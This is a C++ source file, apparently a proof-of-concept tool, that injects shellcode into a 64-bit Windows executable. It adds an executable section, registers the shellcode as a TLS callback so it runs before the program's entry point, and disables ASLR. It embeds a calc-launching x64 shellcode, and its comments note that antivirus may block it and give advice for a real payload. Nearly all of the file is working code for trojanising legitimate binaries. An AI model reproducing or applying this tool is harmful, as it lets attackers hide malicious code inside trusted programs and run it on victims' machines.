#include <windows.h>
#include <iostream>
#include <fstream>
#include <vector>

// Dummy shellcode: just a few NOPs and a RET.
// For a real payload, this should preserve registers and not exit the process.
unsigned char dummy_shellcode[] = {
    0x90, 0x90, 0x90, 0x90, // NOPs
    0xC3                    // RET
};

// 默认提供一个弹计算器的x64 Shellcode (可能会被杀毒软件拦截)
// 如果想简单测试是否执行，可以换成死循环Shellcode: { 0xEB, 0xFE }，程序运行后会卡住不输出内容
unsigned char calc_shellcode[] = {
    0x53, 0x56, 0x57, 0x55, 0x54, 0x58, 0x66, 0x83, 0xE4, 0xF0, 0x50, 0x6A,
    0x60, 0x5A, 0x68, 0x63, 0x61, 0x6C, 0x63, 0x54, 0x59, 0x48, 0x29, 0xD4,
    0x65, 0x48, 0x8B, 0x32, 0x48, 0x8B, 0x76, 0x18, 0x48, 0x8B, 0x76, 0x10,
    0x48, 0xAD, 0x48, 0x8B, 0x30, 0x48, 0x8B, 0x7E, 0x30, 0x03, 0x57, 0x3C,
    0x8B, 0x5C, 0x17, 0x28, 0x8B, 0x74, 0x1F, 0x20, 0x48, 0x01, 0xFE, 0x8B,
    0x54, 0x1F, 0x24, 0x0F, 0xB7, 0x2C, 0x17, 0x8D, 0x52, 0x02, 0xAD, 0x81,
    0x3C, 0x07, 0x57, 0x69, 0x6E, 0x45, 0x75, 0xEF, 0x8B, 0x74, 0x1F, 0x1C,
    0x48, 0x01, 0xFE, 0x8B, 0x34, 0xAE, 0x48, 0x01, 0xF7, 0x99, 0xFF, 0xD7,
    0x48, 0x83, 0xC4, 0x68, 0x5C, 0x5D, 0x5F, 0x5E, 0x5B, 0xC3
};

DWORD Align(DWORD size, DWORD align) {
    if (size % align == 0) return size;
    return size + (align - (size % align));
}

bool InjectTLS(const char* targetFile, const char* outputFile) {
    std::ifstream file(targetFile, std::ios::binary | std::ios::ate);
    if (!file) {
        std::cerr << "Cannot open target file.\n";
        return false;
    }

    std::streamsize size = file.tellg();
    file.seekg(0, std::ios::beg);
    std::vector<unsigned char> buffer(size);
    if (!file.read(reinterpret_cast<char*>(buffer.data()), size)) {
        std::cerr << "Failed to read target file.\n";
        return false;
    }
    file.close();

    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)buffer.data();
    if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
        std::cerr << "Not a valid DOS executable.\n";
        return false;
    }

    PIMAGE_NT_HEADERS64 ntHeaders = (PIMAGE_NT_HEADERS64)(buffer.data() + dosHeader->e_lfanew);
    if (ntHeaders->Signature != IMAGE_NT_SIGNATURE) {
        std::cerr << "Not a valid PE file.\n";
        return false;
    }

    if (ntHeaders->OptionalHeader.Magic != IMAGE_NT_OPTIONAL_HDR64_MAGIC) {
        std::cerr << "Only 64-bit PE files are supported for this PoC.\n";
        return false;
    }

    // Prepare new section
    PIMAGE_SECTION_HEADER sectionHeader = IMAGE_FIRST_SECTION(ntHeaders);
    PIMAGE_SECTION_HEADER lastSection = &sectionHeader[ntHeaders->FileHeader.NumberOfSections - 1];
    PIMAGE_SECTION_HEADER newSection = lastSection + 1;

    // Check if there's space for a new section header
    DWORD headersEnd = dosHeader->e_lfanew + sizeof(IMAGE_NT_HEADERS64) + ntHeaders->FileHeader.NumberOfSections * sizeof(IMAGE_SECTION_HEADER);
    if (headersEnd + sizeof(IMAGE_SECTION_HEADER) > ntHeaders->OptionalHeader.SizeOfHeaders) {
        std::cerr << "No space for new section header.\n";
        return false;
    }

    // Define new section characteristics
    memset(newSection, 0, sizeof(IMAGE_SECTION_HEADER));
    memcpy(newSection->Name, ".tlsinj", 7);
    
    // Virtual Address and Size
    newSection->VirtualAddress = Align(lastSection->VirtualAddress + lastSection->Misc.VirtualSize, ntHeaders->OptionalHeader.SectionAlignment);
    
    // Raw Address and Size
    newSection->PointerToRawData = Align(lastSection->PointerToRawData + lastSection->SizeOfRawData, ntHeaders->OptionalHeader.FileAlignment);
    
    newSection->Characteristics = IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE | IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_CNT_INITIALIZED_DATA;

    // We will place the shellcode and potentially the TLS directory and callback array in the new section
    // Layout of new section:
    // [Shellcode]
    // [Padding to 8 bytes]
    // [New Callback Array (if needed)]
    // [IMAGE_TLS_DIRECTORY64 (if needed)]

    DWORD sectionSize = 0;
    std::vector<unsigned char> sectionData;

    // 1. Add shellcode
    for (auto b : calc_shellcode) sectionData.push_back(b);
    
    // Align to 8 bytes for pointers
    while (sectionData.size() % 8 != 0) sectionData.push_back(0);

    DWORD shellcodeRVA = newSection->VirtualAddress;
    ULONGLONG shellcodeVA = ntHeaders->OptionalHeader.ImageBase + shellcodeRVA;

    DWORD tlsDirRVA = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS].VirtualAddress;
    DWORD tlsDirSize = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS].Size;

    if (tlsDirRVA != 0 && tlsDirSize != 0) {
        std::cout << "[+] Existing TLS directory found. Modifying callbacks array.\n";
        
        // Find the existing TLS directory in the sections
        PIMAGE_TLS_DIRECTORY64 pTlsDir = nullptr;
        for (int i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
            if (tlsDirRVA >= sectionHeader[i].VirtualAddress && tlsDirRVA < sectionHeader[i].VirtualAddress + sectionHeader[i].Misc.VirtualSize) {
                DWORD offset = tlsDirRVA - sectionHeader[i].VirtualAddress + sectionHeader[i].PointerToRawData;
                pTlsDir = (PIMAGE_TLS_DIRECTORY64)(buffer.data() + offset);
                break;
            }
        }

        if (!pTlsDir) {
            std::cerr << "[-] Failed to locate TLS directory in file.\n";
            return false;
        }

        ULONGLONG callbackArrayVA = pTlsDir->AddressOfCallBacks;
        DWORD callbackArrayRVA = callbackArrayVA - ntHeaders->OptionalHeader.ImageBase;
        
        // Read existing callbacks
        std::vector<ULONGLONG> callbacks;
        if (callbackArrayVA != 0) {
            DWORD cbOffset = 0;
            for (int i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
                if (callbackArrayRVA >= sectionHeader[i].VirtualAddress && callbackArrayRVA < sectionHeader[i].VirtualAddress + sectionHeader[i].Misc.VirtualSize) {
                    cbOffset = callbackArrayRVA - sectionHeader[i].VirtualAddress + sectionHeader[i].PointerToRawData;
                    break;
                }
            }
            if (cbOffset != 0) {
                ULONGLONG* pCb = (ULONGLONG*)(buffer.data() + cbOffset);
                while (*pCb != 0) {
                    callbacks.push_back(*pCb);
                    pCb++;
                }
            }
        }

        // Add our new callback
        callbacks.push_back(shellcodeVA);
        callbacks.push_back(0); // Null terminator

        // Put the new callback array into our new section
        DWORD newCallbackArrayOffset = sectionData.size();
        for (auto cb : callbacks) {
            for (int i = 0; i < 8; i++) {
                sectionData.push_back((cb >> (i * 8)) & 0xFF);
            }
        }

        // Update the TLS directory to point to our new callback array
        ULONGLONG newCallbackArrayVA = ntHeaders->OptionalHeader.ImageBase + newSection->VirtualAddress + newCallbackArrayOffset;
        pTlsDir->AddressOfCallBacks = newCallbackArrayVA;

    } else {
        std::cout << "[+] No TLS directory found. Creating one.\n";

        // Create new callback array
        DWORD newCallbackArrayOffset = sectionData.size();
        ULONGLONG callbacks[] = { shellcodeVA, 0 };
        for (auto cb : callbacks) {
            for (int i = 0; i < 8; i++) {
                sectionData.push_back((cb >> (i * 8)) & 0xFF);
            }
        }

        // Create new TLS Directory
        DWORD newTlsDirOffset = sectionData.size();
        IMAGE_TLS_DIRECTORY64 newTlsDir = {0};
        
        // We need to provide valid addresses for StartAddressOfRawData and EndAddressOfRawData
        // We can just point them to an empty area in our section
        DWORD dummyDataOffset = sectionData.size() + sizeof(IMAGE_TLS_DIRECTORY64);
        ULONGLONG dummyDataVA = ntHeaders->OptionalHeader.ImageBase + newSection->VirtualAddress + dummyDataOffset;
        
        newTlsDir.StartAddressOfRawData = dummyDataVA;
        newTlsDir.EndAddressOfRawData = dummyDataVA + 8;
        newTlsDir.AddressOfIndex = dummyDataVA + 16;
        newTlsDir.AddressOfCallBacks = ntHeaders->OptionalHeader.ImageBase + newSection->VirtualAddress + newCallbackArrayOffset;
        newTlsDir.SizeOfZeroFill = 0;
        newTlsDir.Characteristics = 0;

        unsigned char* pTls = (unsigned char*)&newTlsDir;
        for (int i = 0; i < sizeof(IMAGE_TLS_DIRECTORY64); i++) {
            sectionData.push_back(pTls[i]);
        }
        
        // Add dummy data for index and raw data
        for (int i = 0; i < 24; i++) sectionData.push_back(0);

        // Update Data Directory
        ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS].VirtualAddress = newSection->VirtualAddress + newTlsDirOffset;
        ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS].Size = sizeof(IMAGE_TLS_DIRECTORY64);
    }

    newSection->Misc.VirtualSize = sectionData.size();
    newSection->SizeOfRawData = Align(sectionData.size(), ntHeaders->OptionalHeader.FileAlignment);

    // Update headers
    ntHeaders->FileHeader.NumberOfSections++;
    ntHeaders->OptionalHeader.SizeOfImage = Align(newSection->VirtualAddress + newSection->Misc.VirtualSize, ntHeaders->OptionalHeader.SectionAlignment);
    
    // Disable ASLR to avoid relocation issues for our injected absolute VAs
    ntHeaders->OptionalHeader.DllCharacteristics &= ~IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE;

    // Write output file
    std::ofstream out(outputFile, std::ios::binary);
    if (!out) {
        std::cerr << "Cannot create output file.\n";
        return false;
    }

    // Write original data up to the start of the new section
    buffer.resize(newSection->PointerToRawData, 0); // Pad if needed
    out.write((char*)buffer.data(), buffer.size());

    // Write new section data
    std::vector<unsigned char> alignedSectionData = sectionData;
    alignedSectionData.resize(newSection->SizeOfRawData, 0);
    out.write((char*)alignedSectionData.data(), alignedSectionData.size());

    std::cout << "[+] Injected successfully into " << outputFile << "\n";
    return true;
}

int main(int argc, char* argv[]) {
    if (argc != 3) {
        std::cout << "Usage: " << argv[0] << " <target_file> <output_file>\n";
        return 1;
    }
    InjectTLS(argv[1], argv[2]);
    return 0;
}
